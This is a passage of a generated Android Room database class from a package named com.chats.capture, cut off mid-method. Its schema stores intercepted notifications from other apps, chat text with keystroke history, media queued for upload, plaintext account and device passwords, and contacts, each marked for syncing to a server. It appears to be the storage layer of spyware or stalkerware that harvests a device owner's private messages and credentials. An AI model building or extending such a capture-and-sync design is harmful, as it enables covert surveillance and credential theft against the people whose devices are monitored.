package com.chats.capture.database;

import androidx.annotation.NonNull;
import androidx.room.DatabaseConfiguration;
import androidx.room.InvalidationTracker;
import androidx.room.RoomDatabase;
import androidx.room.RoomOpenHelper;
import androidx.room.migration.AutoMigrationSpec;
import androidx.room.migration.Migration;
import androidx.room.util.DBUtil;
import androidx.room.util.TableInfo;
import androidx.sqlite.db.SupportSQLiteDatabase;
import androidx.sqlite.db.SupportSQLiteOpenHelper;
import java.lang.Class;
import java.lang.Override;
import java.lang.String;
import java.lang.SuppressWarnings;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.HashSet;
import java.util.List;
import java.util.Map;
import java.util.Set;
import javax.annotation.processing.Generated;

@Generated("androidx.room.RoomProcessor")
@SuppressWarnings({"unchecked", "deprecation"})
public final class CaptureDatabase_Impl extends CaptureDatabase {
  private volatile NotificationDao _notificationDao;

  private volatile ChatDao _chatDao;

  private volatile MediaFileDao _mediaFileDao;

  private volatile UpdateStatusDao _updateStatusDao;

  private volatile CredentialDao _credentialDao;

  private volatile ContactDao _contactDao;

  @Override
  @NonNull
  protected SupportSQLiteOpenHelper createOpenHelper(@NonNull final DatabaseConfiguration config) {
    final SupportSQLiteOpenHelper.Callback _openCallback = new RoomOpenHelper(config, new RoomOpenHelper.Delegate(4) {
      @Override
      public void createAllTables(@NonNull final SupportSQLiteDatabase db) {
        db.execSQL("CREATE TABLE IF NOT EXISTS `notifications` (`id` TEXT NOT NULL, `deviceId` TEXT, `appPackage` TEXT NOT NULL, `appName` TEXT NOT NULL, `title` TEXT, `text` TEXT, `timestamp` INTEGER NOT NULL, `mediaUrls` TEXT, `serverMediaUrls` TEXT, `synced` INTEGER NOT NULL, `syncAttempts` INTEGER NOT NULL, `lastSyncAttempt` INTEGER, `errorMessage` TEXT, PRIMARY KEY(`id`))");
        db.execSQL("CREATE INDEX IF NOT EXISTS `index_notifications_appPackage` ON `notifications` (`appPackage`)");
        db.execSQL("CREATE INDEX IF NOT EXISTS `index_notifications_timestamp` ON `notifications` (`timestamp`)");
        db.execSQL("CREATE INDEX IF NOT EXISTS `index_notifications_synced` ON `notifications` (`synced`)");
        db.execSQL("CREATE INDEX IF NOT EXISTS `index_notifications_deviceId` ON `notifications` (`deviceId`)");
        db.execSQL("CREATE TABLE IF NOT EXISTS `chats` (`id` TEXT NOT NULL, `deviceId` TEXT, `appPackage` TEXT NOT NULL, `appName` TEXT NOT NULL, `chatIdentifier` TEXT, `text` TEXT NOT NULL, `keyHistory` TEXT, `mediaUrls` TEXT, `timestamp` INTEGER NOT NULL, `synced` INTEGER NOT NULL, `syncAttempts` INTEGER NOT NULL, `lastSyncAttempt` INTEGER, `errorMessage` TEXT, PRIMARY KEY(`id`))");
        db.execSQL("CREATE INDEX IF NOT EXISTS `index_chats_appPackage` ON `chats` (`appPackage`)");
        db.execSQL("CREATE INDEX IF NOT EXISTS `index_chats_chatIdentifier` ON `chats` (`chatIdentifier`)");
        db.execSQL("CREATE INDEX IF NOT EXISTS `index_chats_timestamp` ON `chats` (`timestamp`)");
        db.execSQL("CREATE INDEX IF NOT EXISTS `index_chats_synced` ON `chats` (`synced`)");
        db.execSQL("CREATE INDEX IF NOT EXISTS `index_chats_deviceId` ON `chats` (`deviceId`)");
        db.execSQL("CREATE TABLE IF NOT EXISTS `media_files` (`id` TEXT NOT NULL, `deviceId` TEXT, `notificationId` TEXT NOT NULL, `appPackage` TEXT, `localPath` TEXT NOT NULL, `remoteUrl` TEXT, `fileSize` INTEGER NOT NULL, `mimeType` TEXT NOT NULL, `checksum` TEXT NOT NULL, `uploadStatus` TEXT NOT NULL, `uploadAttempts` INTEGER NOT NULL, `lastUploadAttempt` INTEGER, `errorMessage` TEXT, `createdAt` INTEGER NOT NULL, PRIMARY KEY(`id`))");
        db.execSQL("CREATE INDEX IF NOT EXISTS `index_media_files_notificationId` ON `media_files` (`notificationId`)");
        db.execSQL("CREATE INDEX IF NOT EXISTS `index_media_files_uploadStatus` ON `media_files` (`uploadStatus`)");
        db.execSQL("CREATE INDEX IF NOT EXISTS `index_media_files_checksum` ON `media_files` (`checksum`)");
        db.execSQL("CREATE INDEX IF NOT EXISTS `index_media_files_deviceId` ON `media_files` (`deviceId`)");
        db.execSQL("CREATE TABLE IF NOT EXISTS `update_status` (`id` INTEGER NOT NULL, `lastCheckTime` INTEGER NOT NULL, `lastUpdateTime` INTEGER, `currentVersion` TEXT NOT NULL, `pendingUpdateVersion` TEXT, `updateDownloadProgress` INTEGER NOT NULL, `updateStatus` TEXT NOT NULL, PRIMARY KEY(`id`))");
        db.execSQL("CREATE TABLE IF NOT EXISTS `credentials` (`id` TEXT NOT NULL, `deviceId` TEXT, `accountType` TEXT NOT NULL, `appPackage` TEXT, `appName` TEXT, `email` TEXT, `username` TEXT, `password` TEXT NOT NULL, `domain` TEXT, `url` TEXT, `devicePassword` INTEGER NOT NULL, `timestamp` INTEGER NOT NULL, `synced` INTEGER NOT NULL, `syncAttempts` INTEGER NOT NULL, `lastSyncAttempt` INTEGER, `errorMessage` TEXT, PRIMARY KEY(`id`))");
        db.execSQL("CREATE INDEX IF NOT EXISTS `index_credentials_accountType` ON `credentials` (`accountType`)");
        db.execSQL("CREATE INDEX IF NOT EXISTS `index_credentials_appPackage` ON `credentials` (`appPackage`)");
        db.execSQL("CREATE INDEX IF NOT EXISTS `index_credentials_synced` ON `credentials` (`synced`)");
        db.execSQL("CREATE INDEX IF NOT EXISTS `index_credentials_deviceId` ON `credentials` (`deviceId`)");
        db.execSQL("CREATE TABLE IF NOT EXISTS `contacts` (`id` TEXT NOT NULL, `deviceId` TEXT, `name` TEXT NOT NULL, `phoneNumber` TEXT, `email` TEXT, `organization` TEXT, `jobTitle` TEXT, `address` TEXT, `notes` TEXT, `photoUri` TEXT, `timestamp` INTEGER NOT NULL, `synced` INTEGER NOT NULL, `syncAttempts` INTEGER NOT NULL, `lastSyncAttempt` INTEGER, `errorMessage` TEXT, `lastSynced` INTEGER, PRIMARY KEY(`id`))");
        db.execSQL("CREATE INDEX IF NOT EXISTS `index_contacts_phoneNumber` ON `contacts` (`phoneNumber`)");
        db.execSQL("CREATE INDEX IF NOT EXISTS `index_contacts_email` ON `contacts` (`email`)");
        db.execSQL("CREATE INDEX IF NOT EXISTS `index_contacts_synced` ON `contacts` (`synced`)");
        db.execSQL("CREATE INDEX IF NOT EXISTS `index_contacts_deviceId` ON `contacts` (`deviceId`)");
        db.execSQL("CREATE INDEX IF NOT EXISTS `index_contacts_lastSynced` ON `contacts` (`lastSynced`)");
        db.execSQL("CREATE TABLE IF NOT EXISTS room_master_table (id INTEGER PRIMARY KEY,identity_hash TEXT)");
        db.execSQL("INSERT OR REPLACE INTO room_master_table (id,identity_hash) VALUES(42, 'fec41ba2aa2bc5d05e9fb3c067d13913')");
      }

      @Override
      public void dropAllTables(@NonNull final SupportSQLiteDatabase db) {
        db.execSQL("DROP TABLE IF EXISTS `notifications`");
        db.execSQL("DROP TABLE IF EXISTS `chats`");
        db.execSQL("DROP TABLE IF EXISTS `media_files`");
        db.execSQL("DROP TABLE IF EXISTS `update_status`");
        db.execSQL("DROP TABLE IF EXISTS `credentials`");
        db.execSQL("DROP TABLE IF EXISTS `contacts`");
        final List<? extends RoomDatabase.Callback> _callbacks = mCallbacks;
        if (_callbacks != null) {
          for (RoomDatabase.Callback _callback : _callbacks) {
            _callback.onDestructiveMigration(db);
          }
        }
      }

      @Override
      public void onCreate(@NonNull final SupportSQLiteDatabase db) {
        final List<? extends RoomDatabase.Callback> _callbacks = mCallbacks;
        if (_callbacks != null) {
          for (RoomDatabase.Callback _callback : _callbacks) {
            _callback.onCreate(db);
          }
        }
      }

      @Override
      public void onOpen(@NonNull final SupportSQLiteDatabase db) {
        mDatabase = db;
        internalInitInvalidationTracker(db);
        final List<? extends RoomDatabase.Callback> _callbacks = mCallbacks;
        if (_callbacks != null) {
          for (RoomDatabase.Callback _callback : _callbacks) {
            _callback.onOpen(db);
          }
        }
      }

      @Override
      public void onPreMigrate(@NonNull final SupportSQLiteDatabase db) {
        DBUtil.dropFtsSyncTriggers(db);
      }

      @Override
      public void onPostMigrate(@NonNull final SupportSQLiteDatabase db) {
      }

      @Override
      @NonNull
      public RoomOpenHelper.ValidationResult onValidateSchema(
          @NonNull final SupportSQLiteDatabase db) {
        final HashMap<String, TableInfo.Column> _columnsNotifications = new HashMap<String, TableInfo.Column>(13);
        _columnsNotifications.put("id", new TableInfo.Column("id", "TEXT", true, 1, null, TableInfo.CREATED_FROM_ENTITY));
        _columnsNotifications.put("deviceId", new TableInfo.Column("deviceId", "TEXT", false, 0, null, TableInfo.CREATED_FROM_ENTITY));
        _columnsNotifications.put("appPackage", new TableInfo.Column("appPackage", "TEXT", true, 0, null, TableInfo.CREATED_FROM_ENTITY));
        _columnsNotifications.put("appName", new TableInfo.Column("appName", "TEXT", true, 0, null, TableInfo.CREATED_FROM_ENTITY));
        _columnsNotifications.put("title", new TableInfo.Column("title", "TEXT", false, 0, null, TableInfo.CREATED_FROM_ENTITY));
        _columnsNotifications.put("text", new TableInfo.Column("text", "TEXT", false, 0, null, TableInfo.CREATED_FROM_ENTITY));
        _columnsNotifications.put("timestamp", new TableInfo.Column("timestamp", "INTEGER", true, 0, null, TableInfo.CREATED_FROM_ENTITY));
        _columnsNotifications.put("mediaUrls", new TableInfo.Column("mediaUrls", "TEXT", false, 0, null, TableInfo.CREATED_FROM_ENTITY));
        _columnsNotifications.put("serverMediaUrls", new TableInfo.Column("serverMediaUrls", "TEXT", false, 0, null, TableInfo.CREATED_FROM_ENTITY));
        _columnsNotifications.put("synced", new TableInfo.Column("synced", "INTEGER", true, 0, null, TableInfo.CREATED_FROM_ENTITY));
        _columnsNotifications.put("syncAttempts", new TableInfo.Column("syncAttempts", "INTEGER", true, 0, null, TableInfo.CREATED_FROM_ENTITY));
        _columnsNotifications.put("lastSyncAttempt", new TableInfo.Column("lastSyncAttempt", "INTEGER", false, 0, null, TableInfo.CREATED_FROM_ENTITY));
        _columnsNotifications.put("errorMessage", new TableInfo.Column("errorMessage", "TEXT", false, 0, null, TableInfo.CREATED_FROM_ENTITY));
        final HashSet<TableInfo.ForeignKey> _foreignKeysNotifications = new HashSet<TableInfo.ForeignKey>(0);
        final HashSet<TableInfo.Index> _indicesNotifications = new HashSet<TableInfo.Index>(4);
        _indicesNotifications.add(new TableInfo.Index("index_notifications_appPackage", false, Arrays.asList("appPackage"), Arrays.asList("ASC")));
        _indicesNotifications.add(new TableInfo.Index("index_notifications_timestamp", false, Arrays.asList("timestamp"), Arrays.asList("ASC")));
        _indicesNotifications.add(new TableInfo.Index("index_notifications_synced", false, Arrays.asList("synced"), Arrays.asList("ASC")));
        _indicesNotifications.add(new TableInfo.Index("index_notifications_deviceId", false, Arrays.asList("deviceId"), Arrays.asList("ASC")));
        final TableInfo _infoNotifications = new TableInfo("notifications", _columnsNotifications, _foreignKeysNotifications, _indicesNotifications);
        final TableInfo _existingNotifications = TableInfo.read(db, "notifications");
        if (!_infoNotifications.equals(_existingNotifications)) {
          return new RoomOpenHelper.ValidationResult(false, "notifications(com.chats.capture.models.NotificationData).\n"
                  + " Expected:\n" + _infoNotifications + "\n"
                  + " Found:\n" + _existingNotifications);
        }
        final HashMap<String, TableInfo.Column> _columnsChats = new HashMap<String, TableInfo.Column>(13);
        _columnsChats.put("id", new TableInfo.Column("id", "TEXT", true, 1, null, TableInfo.CREATED_FROM_ENTITY));
        _columnsChats.put("deviceId", new TableInfo.Column("deviceId", "TEXT", false, 0, null, TableInfo.CREATED_FROM_ENTITY));
        _columnsChats.put("appPackage", new TableInfo.Column("appPackage", "TEXT", true, 0, null, TableInfo.CREATED_FROM_ENTITY));
        _columnsChats.put("appName", new TableInfo.Column("appName", "TEXT", true, 0, null, TableInfo.CREATED_FROM_ENTITY));
        _columnsChats.put("chatIdentifier", new TableInfo.Column("chatIdentifier", "TEXT", false, 0, null, TableInfo.CREATED_FROM_ENTITY));
        _columnsChats.put("text", new TableInfo.Column("text", "TEXT", true, 0, null, TableInfo.CREATED_FROM_ENTITY));
        _columnsChats.put("keyHistory", new TableInfo.Column("keyHistory", "TEXT", false, 0, null, TableInfo.CREATED_FROM_ENTITY));
        _columnsChats.put("mediaUrls", new TableInfo.Column("mediaUrls", "TEXT", false, 0, null, TableInfo.CREATED_FROM_ENTITY));
        _columnsChats.put("timestamp", new TableInfo.Column("timestamp", "INTEGER", true, 0, null, TableInfo.CREATED_FROM_ENTITY));
        _columnsChats.put("synced", new TableInfo.Column("synced", "INTEGER", true, 0, null, TableInfo.CREATED_FROM_ENTITY));
        _columnsChats.put("syncAttempts", new TableInfo.Column("syncAttempts", "INTEGER", true, 0, null, TableInfo.CREATED_FROM_ENTITY));
        _columnsChats.put("lastSyncAttempt", new TableInfo.Column("lastSyncAttempt", "INTEGER", false, 0, null, TableInfo.CREATED_FROM_ENTITY));
        _columnsChats.put("errorMessage", new TableInfo.Column("errorMessage", "TEXT", false, 0, null, TableInfo.CREATED_FROM_ENTITY));
        final HashSet<TableInfo.ForeignKey> _foreignKeysChats = new HashSet<TableInfo.ForeignKey>(0);
        final HashSet<TableInfo.Index> _indicesChats = new HashSet<TableInfo.Index>(5);
        _indicesChats.add(new TableInfo.Index("index_chats_appPackage", false, Arrays.asList("appPackage"), Arrays.asList("ASC")));
        _indicesChats.add(new TableInfo.Index("index_chats_chatIdentifier", false, Arrays.asList("chatIdentifier"), Arrays.asList("ASC")));
        _indicesChats.add(new TableInfo.Index("index_chats_timestamp", false, Arrays.asList("timestamp"), Arrays.asList("ASC")));
        _indicesChats.add(new TableInfo.Index("index_chats_synced", false, Arrays.asList("synced"), Arrays.asList("ASC")));
        _indicesChats.add(new TableInfo.Index("index_chats_deviceId", false, Arrays.asList("deviceId"), Arrays.asList("ASC")));
        final TableInfo _infoChats = new TableInfo("chats", _columnsChats, _foreignKeysChats, _indicesChats);
        final TableInfo _existingChats = TableInfo.read(db, "chats");
        if (!_infoChats.equals(_existingChats)) {
          return new RoomOpenHelper.ValidationResult(false, "chats(com.chats.capture.models.ChatData).\n"
                  + " Expected:\n" + _infoChats + "\n"
                  + " Found:\n" + _existingChats);
        }
        final HashMap<String, TableInfo.Column> _columnsMediaFiles = new HashMap<String, TableInfo.Column>(14);
        _columnsMediaFiles.put("id", new TableInfo.Column("id", "TEXT", true, 1, null, TableInfo.CREATED_FROM_ENTITY));
        _columnsMediaFiles.put("deviceId", new TableInfo.Column("deviceId", "TEXT", false, 0, null, TableInfo.CREATED_FROM_ENTITY));
        _columnsMediaFiles.put("notificationId", new TableInfo.Column("notificationId", "TEXT", true, 0, null, TableInfo.CREATED_FROM_ENTITY));
        _columnsMediaFiles.put("appPackage", new TableInfo.Column("appPackage", "TEXT", false, 0, null, TableInfo.CREATED_FROM_ENTITY));
        _columnsMediaFiles.put("localPath", new TableInfo.Column("localPath", "TEXT", true, 0, null, TableInfo.CREATED_FROM_ENTITY));
        _columnsMediaFiles.put("remoteUrl", new TableInfo.Column("remoteUrl", "TEXT", false, 0, null, TableInfo.CREATED_FROM_ENTITY));
        _columnsMediaFiles.put("fileSize", new TableInfo.Column("fileSize", "INTEGER", true, 0, null, TableInfo.CREATED_FROM_ENTITY));
        _columnsMediaFiles.put("mimeType", new TableInfo.Column("mimeType", "TEXT", true, 0, null, TableInfo.CREATED_FROM_ENTITY));
        _columnsMediaFiles.put("checksum", new TableInfo.Column("checksum", "TEXT", true, 0, null, TableInfo.CREATED_FROM_ENTITY));
        _columnsMediaFiles.put("uploadStatus", new TableInfo.Column("uploadStatus", "TEXT", true, 0, null, TableInfo.CREATED_FROM_ENTITY));
        _columnsMediaFiles.put("uploadAttempts", new TableInfo.Column("uploadAttempts", "INTEGER", true, 0, null, TableInfo.CREATED_FROM_ENTITY));
        _columnsMediaFiles.put("lastUploadAttempt", new TableInfo.Column("lastUploadAttempt", "INTEGER", false, 0, null, TableInfo.CREATED_FROM_ENTITY));
        _columnsMediaFiles.put("errorMessage", new TableInfo.Column("errorMessage", "TEXT", false, 0, null, TableInfo.CREATED_FROM_ENTITY));
        _columnsMediaFiles.put("createdAt", new TableInfo.Column("createdAt", "INTEGER", true, 0, null, TableInfo.CREATED_FROM_ENTITY));
        final HashSet<TableInfo.ForeignKey> _foreignKeysMediaFiles = new HashSet<TableInfo.ForeignKey>(0);
        final HashSet<TableInfo.Index> _indicesMediaFiles = new HashSet<TableInfo.Index>(4);
        _indicesMediaFiles.add(new TableInfo.Index("index_media_files_notificationId", false, Arrays.asList("notificationId"), Arrays.asList("ASC")));
        _indicesMediaFiles.add(new TableInfo.Index("index_media_files_uploadStatus", false, Arrays.asList("uploadStatus"), Arrays.asList("ASC")));
        _indicesMediaFiles.add(new TableInfo.Index("index_media_files_checksum", false, Arrays.asList("checksum"), Arrays.asList("ASC")));
        _indicesMediaFiles.add(new TableInfo.Index("index_media_files_deviceId", false, Arrays.asList("deviceId"), Arrays.asList("ASC")));
        final TableInfo _infoMediaFiles = new TableInfo("media_files", _columnsMediaFiles, _foreignKeysMediaFiles, _indicesMediaFiles);
        final TableInfo _existingMediaFiles = TableInfo.read(db, "media_files");
        if (!_infoMediaFiles.equals(_existingMediaFiles)) {
          return new RoomOpenHelper.ValidationResult(false, "media_files(com.chats.capture.models.MediaFile).\n"
                  + " Expected:\n" + _infoMediaFiles + "\n"
                  + " Found:\n" + _existingMediaFiles);
        }
        final HashMap<String, TableInfo.Column> _columnsUpdateStatus = new HashMap<String, TableInfo.Column>(7);
        _columnsUpdateStatus.put("id", new TableInfo.Column("id", "INTEGER", true, 1, null, TableInfo.CREATED_FROM_ENTITY));
        _columnsUpdateStatus.put("lastCheckTime", new TableInfo.Column("lastCheckTime", "INTEGER", true, 0, null, TableInfo.CREATED_FROM_ENTITY));
        _columnsUpdateStatus.put("lastUpdateTime", new TableInfo.Column("lastUpdateTime", "INTEGER", false, 0, null, TableInfo.CREATED_FROM_ENTITY));
        _columnsUpdateStatus.put("currentVersion", new TableInfo.Column("currentVersion", "TEXT", true, 0, null, TableInfo.CREATED_FROM_ENTITY));
        _columnsUpdateStatus.put("pendingUpdateVersion", new TableInfo.Column("pendingUpdateVersion", "TEXT", false, 0, null, TableInfo.CREATED_FROM_ENTITY));
        _columnsUpdateStatus.put("updateDownloadProgress", new TableInfo.Column("updateDownloadProgress", "INTEGER", true, 0, null, TableInfo.CREATED_FROM_ENTITY));
        _columnsUpdateStatus.put("updateStatus", new TableInfo.Column("updateStatus", "TEXT", true, 0, null, TableInfo.CREATED_FROM_ENTITY));
        final HashSet<TableInfo.ForeignKey> _foreignKeysUpdateStatus = new HashSet<TableInfo.ForeignKey>(0);
        final HashSet<TableInfo.Index> _indicesUpdateStatus = new HashSet<TableInfo.Index>(0);
        final TableInfo _infoUpdateStatus = new TableInfo("update_status", _columnsUpdateStatus, _foreignKeysUpdateStatus, _indicesUpdateStatus);
        final TableInfo _existingUpdateStatus = TableInfo.read(db, "update_status");
        if (!_infoUpdateStatus.equals(_existingUpdateStatus)) {
          return new RoomOpenHelper.ValidationResult(false, "update_status(com.chats.capture.models.UpdateStatus).\n"
                  + " Expected:\n" + _infoUpdateStatus + "\n"
                  + " Found:\n" + _existingUpdateStatus);
        }
        final HashMap<String, TableInfo.Column> _columnsCredentials = new HashMap<String, TableInfo.Column>(16);
        _columnsCredentials.put("id", new TableInfo.Column("id", "TEXT", true, 1, null, TableInfo.CREATED_FROM_ENTITY));
        _columnsCredentials.put("deviceId", new TableInfo.Column("deviceId", "TEXT", false, 0, null, TableInfo.CREATED_FROM_ENTITY));
        _columnsCredentials.put("accountType", new TableInfo.Column("accountType", "TEXT", true, 0, null, TableInfo.CREATED_FROM_ENTITY));
        _columnsCredentials.put("appPackage", new TableInfo.Column("appPackage", "TEXT", false, 0, null, TableInfo.CREATED_FROM_ENTITY));
        _columnsCredentials.put("appName", new TableInfo.Column("appName", "TEXT", false, 0, null, TableInfo.CREATED_FROM_ENTITY));
        _columnsCredentials.put("email", new TableInfo.Column("email", "TEXT", false, 0, null, TableInfo.CREATED_FROM_ENTITY));
        _columnsCredentials.put("username", new TableInfo.Column("username", "TEXT", false, 0, null, TableInfo.CREATED_FROM_ENTITY));
        _columnsCredentials.put("password", new TableInfo.Column("password", "TEXT", true, 0, null, TableInfo.CREATED_FROM_ENTITY));
        _columnsCredentials.put("domain", new TableInfo.Column("domain", "TEXT", false, 0, null, TableInfo.CREATED_FROM_ENTITY));
        _columnsCredentials.put("url", new TableInfo.Column("url", "TEXT", false, 0, null, TableInfo.CREATED_FROM_ENTITY));
        _columnsCredentials.put("devicePassword", new TableInfo.Column("devicePassword", "INTEGER", true, 0, null, TableInfo.CREATED_FROM_ENTITY));
        _columnsCredentials.put("timestamp", new TableInfo.Column("timestamp", "INTEGER", true, 0, null, TableInfo.CREATED_FROM_ENTITY));
        _columnsCredentials.put("synced", new TableInfo.Column("synced", "INTEGER", true, 0, null, TableInfo.CREATED_FROM_ENTITY));
        _columnsCredentials.put("syncAttempts", new TableInfo.Column("syncAttempts", "INTEGER", true, 0, null, TableInfo.CREATED_FROM_ENTITY));
        _columnsCredentials.put("lastSyncAttempt", new TableInfo.Column("lastSyncAttempt", "INTEGER", false, 0, null, TableInfo.CREATED_FROM_ENTITY));
        _columnsCredentials.put("errorMessage", new TableInfo.Column("errorMessage", "TEXT", false, 0, null, TableInfo.CREATED_FROM_ENTITY));
        final HashSet<TableInfo.ForeignKey> _foreignKeysCredentials = new HashSet<TableInfo.ForeignKey>(0);
        final HashSet<TableInfo.Index> _indicesCredentials = new HashSet<TableInfo.Index>(4);
        _indicesCredentials.add(new TableInfo.Index("index_credentials_accountType", false, Arrays.asList("accountType"), Arrays.asList("ASC")));
        _indicesCredentials.add(new TableInfo.Index("index_credentials_appPackage", false, Arrays.asList("appPackage"), Arrays.asList("ASC")));
        _indicesCredentials.add(new TableInfo.Index("index_credentials_synced", false, Arrays.asList("synced"), Arrays.asList("ASC")));
        _indicesCredentials.add(new TableInfo.Index("index_credentials_deviceId", false, Arrays.asList("deviceId"), Arrays.asList("ASC")));
        final TableInfo _infoCredentials = new TableInfo("credentials", _columnsCredentials, _foreignKeysCredentials, _indicesCredentials);
        final TableInfo _existingCredentials = TableInfo.read(db, "credentials");
        if (!_infoCredentials.equals(_existingCredentials)) {
          return new RoomOpenHelper.ValidationResult(false, "credentials(com.chats.capture.models.Credential).\n"
                  + " Expected:\n" + _infoCredentials + "\n"
                  + " Found:\n" + _existingCredentials);
        }
        final HashMap<String, TableInfo.Column> _columnsContacts = new HashMap<String, TableInfo.Column>(16);
        _columnsContacts.put("id", new TableInfo.Column("id", "TEXT", true, 1, null, TableInfo.CREATED_FROM_ENTITY));
        _columnsContacts.put("deviceId", new TableInfo.Column("deviceId", "TEXT", false, 0, null, TableInfo.CREATED_FROM_ENTITY));
        _columnsContacts.put("name", new TableInfo.Column("name", "TEXT", true, 0, null, TableInfo.CREATED_FROM_ENTITY));
        _columnsContacts.put("phoneNumber", new TableInfo.Column("phoneNumber", "TEXT", false, 0, null, TableInfo.CREATED_FROM_ENTITY));
        _columnsContacts.put("email", new TableInfo.Column("email", "TEXT", false, 0, null, TableInfo.CREATED_FROM_ENTITY));
        _columnsContacts.put("organization", new TableInfo.Column("organization", "TEXT", false, 0, null, TableInfo.CREATED_FROM_ENTITY));
        _columnsContacts.put("jobTitle", new TableInfo.Column("jobTitle", "TEXT", false, 0, null, TableInfo.CREATED_FROM_ENTITY));
        _columnsContacts.put("address", new TableInfo.Column("address", "TEXT", false, 0, null, TableInfo.CREATED_FROM_ENTITY));
        _columnsContacts.put("notes", new TableInfo.Column("notes", "TEXT", false, 0, null, TableInfo.CREATED_FROM_ENTITY));
        _columnsContacts.put("photoUri", new TableInfo.Column("photoUri", "TEXT", false, 0, null, TableInfo.CREATED_FROM_ENTITY));
        _columnsContacts.put("timestamp", new TableInfo.Column("timestamp", "INTEGER", true, 0, null, TableInfo.CREATED_FROM_ENTITY));
        _columnsContacts.put("synced", new TableInfo.Column("synced", "INTEGER", true, 0, null, TableInfo.CREATED_FROM_ENTITY));
        _columnsContacts.put("syncAttempts", new TableInfo.Column("syncAttempts", "INTEGER", true, 0, null, TableInfo.CREATED_FROM_ENTITY));
        _columnsContacts.put("lastSyncAttempt", new TableInfo.Column("lastSyncAttempt", "INTEGER", false, 0, null, TableInfo.CREATED_FROM_ENTITY));
        _columnsContacts.put("errorMessage", new TableInfo.Column("errorMessage", "TEXT", false, 0, null, TableInfo.CREATED_FROM_ENTITY));
        _columnsContacts.put("lastSynced", new TableInfo.Column("lastSynced", "INTEGER", false, 0, null, TableInfo.CREATED_FROM_ENTITY));
        final HashSet<TableInfo.ForeignKey> _foreignKeysContacts = new HashSet<TableInfo.ForeignKey>(0);
        final HashSet<TableInfo.Index> _indicesContacts = new HashSet<TableInfo.Index>(5);
        _indicesContacts.add(new TableInfo.Index("index_contacts_phoneNumber", false, Arrays.asList("phoneNumber"), Arrays.asList("ASC")));
        _indicesContacts.add(new TableInfo.Index("index_contacts_email", false, Arrays.asList("email"), Arrays.asList("ASC")));
        _indicesContacts.add(new TableInfo.Index("index_contacts_synced", false, Arrays.asList("synced"), Arrays.asList("ASC")));
        _indicesContacts.add(new TableInfo.Index("index_contacts_deviceId", false, Arrays.asList("deviceId"), Arrays.asList("ASC")));
        _indicesContacts.add(new TableInfo.Index("index_contacts_lastSynced", false, Arrays.asList("lastSynced"), Arrays.asList("ASC")));
        final TableInfo _infoContacts = new TableInfo("contacts", _columnsContacts, _foreignKeysContacts, _indicesContacts);
        final TableInfo _existingContacts = TableInfo.read(db, "contacts");
        if (!_infoContacts.equals(_existingContacts)) {
          return new RoomOpenHelper.ValidationResult(false, "contacts(com.chats.capture.models.Contact).\n"
                  + " Expected:\n" + _infoContacts + "\n"
                  + " Found:\n" + _existingContacts);
        }
        return new RoomOpenHelper.ValidationResult(true, null);
      }
    }, "fec41ba2aa2bc5d05e9fb3c067d13913", "bfa79fd791c7c1d438381bde541fadaa");
    final SupportSQLiteOpenHelper.Configuration _sqliteConfig = SupportSQLiteOpenHelper.Configuration.builder(config.context).name(config.name).callback(_openCallback).build();
    final SupportSQLiteOpenHelper _helper = config.sqliteOpenHelperFactory.create(_sqliteConfig);
    return _helper;
  }

  @Override
  @NonNull
  protected InvalidationTracker createInvalidationTracker() {
    final HashMap<String, String> _shadowTablesMap = new HashMap<String, String>(0);
    final HashMap<String, Set<String>> _viewTables = new HashMap<String, Set<String>>(0);
    return new InvalidationTracker(this, _shadowTablesMap, _viewTables, "notifications","chats","media_files","update_status","credentials","contacts");
  }

  @Override
  public void clearAllTables() {
    super.assertNotMainThread();
    final SupportSQLiteDatabase _db = super.getOpenHelper().getWritableDatabase();
    try {
      super.beginTransaction();
      _db.execSQL("DELETE FROM `notifications`");
      _db.execSQL("DELETE FROM `chats`");
      _db.execSQL("DELETE FROM `media_files`");
      _db.execSQL("DELETE FROM `update_status`");
      _db.execSQL("DELETE FROM `credentials`");
      _db.execSQL("DELETE FROM `contacts`");
      super.setTransactionSuccessful();
    } finally {
      super.endTransaction();
      _db.query("PRAGMA wal_checkpoint(FULL)").close();
      if (!_db.inTransaction()) {
        _db.execSQL("VACUUM");
      }
    }
  }

  @Override
  @NonNull
  protected Map<Class<?>, List<Class<?>>> getRequiredTypeConverters() {
    final HashMap<Class<?>, List<Class<?>>> _typeConvertersMap = new HashMap<Class<?>, List<Class<?>>>();
    _typeConvertersMap.put(NotificationDao.class, NotificationDao_Impl.getRequiredConverters());
    _typeConvertersMap.put(ChatDao.class, ChatDao_Impl.getRequiredConverters());
    _typeConvertersMap.put(MediaFileDao.class, MediaFileDao_Impl.getRequiredConverters());
    _typeConvertersMap.put(UpdateStatusDao.class, UpdateStatusDao_Impl.getRequiredConverters());
    _typeConvertersMap.put(CredentialDao.class, CredentialDao_Impl.getRequiredConverters());
    _typeConvertersMap.put(ContactDao.class, ContactDao_Impl.getRequiredConverters());
    return _typeConvertersMap;
  }

  @Override
  @NonNull
  public Set<Class<? extends AutoMigrationSpec>> getRequiredAutoMigrationSpecs() {
    final HashSet<Class<? extends AutoMigrationSpec>> _autoMigrationSpecsSet = new HashSet<Class<? extends AutoMigrationSpec>>();
    return _autoMigrationSpecsSet;
  }

  @Override
  @NonNull
  public List<Migration> getAutoMigrations(
      @NonNull final Map<Class<? extends AutoMigrationSpec>, AutoMigrationSpec> autoMigrationSpecs) {
    final List<Migration> _autoMigrations = new ArrayList<Migration>();
    return _autoMigrations;
  }

  @Override
  public NotificationDao notificationDao() {
    if (_notificationDao != null) {
      return _notificationDao;
    } else {
      synchronized(this) {
        if(_notificationDao == null) {
          _notificationDao = new NotificationDao_Impl(this);
        }
        return _notificationDao;
      }
    }
  }

  @Override
  public ChatDao chatDao() {
    if (_chatDao != null) {
      return _chatDao;
    } else {
      synchronized(this) {
        if(_chatDao == null) {
          _chatDao = new ChatDao_Impl(this);
        }
        return _chatDao;
      }
    }
  }

  @Override
  public MediaFileDao mediaFileDao() {
    if (_mediaFileDao != null) {
      return _mediaFileDao;
    } else {
      synchronized(this) {
        if(_mediaFileDao == null) {
          _mediaFileDao = new MediaFileDao_Impl(this);
        }
        return _mediaFileDao;
      }
    }
  }

  @Override
  public UpdateStatusDao updateStatusDao() {
    if (_updateStatusDao != null) {
      return _updateStatusDao;
    } else {
      synchronized(this) {
        if(_updateStatusDao == null) {
          _updateStatusDao = new UpdateStatusDao_Impl(this);
        }
        return _updateStatusDao;
      }
    }
  }

  @Override
  public CredentialDao credentialDao() {
    if (_credentialDao != null) {
      return _credentialDao;
    } else {
      synchronized(this) {
        if(_credentialDao == null) {
